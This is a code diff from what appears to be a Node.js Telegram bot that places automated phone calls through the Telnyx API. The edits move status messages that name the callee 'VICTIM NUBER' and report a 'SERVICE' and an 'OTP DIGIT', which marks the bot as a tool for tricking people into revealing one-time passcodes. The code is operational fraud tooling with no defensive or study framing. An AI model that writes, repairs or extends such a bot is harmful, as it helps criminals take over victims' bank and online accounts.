@@ -17,13 +17,19 @@ const port = process.env.PORT || 3000;
 
 async function call (customer_number, ctx, service, digit){
    console.log(ctx, 'first yayyyy')
-   bot.telegram.sendMessage(ctx.chat.id, 
-      `
-      CALL STARTING\n 
-      VICTIM NUBER - ${customer_number}\n 
-      SERIVCE - ${service}\n
-      OTP DIGIT - ${digit}
-      `, {})
+   bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
+      reply_markup:{
+         inline_keyboard: [
+            [
+               {
+                  text: 'End Call',
+                  callback_data: 'end'
+               }               
+            ]
+         ]
+      }})
+
+
 
    // Use the Telnyx API to create a new call
    try {
@@ -89,18 +95,13 @@ bot.command('call', ctx => {
       bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
    }
    else{
-      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
-         reply_markup:{
-            inline_keyboard: [
-               [
-                  {
-                     text: 'End Call',
-                     callback_data: 'end'
-                  }               
-               ]
-            ]
-         }
-      }).then(() => {})
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+      ✅CALL STARTING\n 
+      ✅VICTIM NUBER - ${customer_number}\n 
+      ✅SERIVCE - ${service}\n
+      ✅OTP DIGIT - ${digit}
+         `, {})
 
       call(number, ctx, service, 6)
    }
